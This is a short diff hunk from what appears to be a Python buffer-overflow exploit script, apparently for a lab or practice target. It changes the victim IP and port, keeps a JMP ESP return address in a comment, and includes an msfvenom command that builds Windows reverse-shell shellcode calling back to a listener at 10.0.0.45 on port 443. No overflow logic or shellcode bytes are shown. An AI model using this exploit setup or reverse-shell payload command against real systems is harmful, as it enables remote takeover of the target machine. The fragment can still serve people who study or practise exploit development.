@@ -5,8 +5,8 @@
 # 0x148010CF JMP ESP
 import socket
 
-victim = "10.0.0.68"
-port = 7001
+victim = "10.0.0.0"
+port = 9999
 
 ## msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.45 LPORT=443 -f py -b '\x00' -v shellcode exitfunc=thread
 ## shellcode
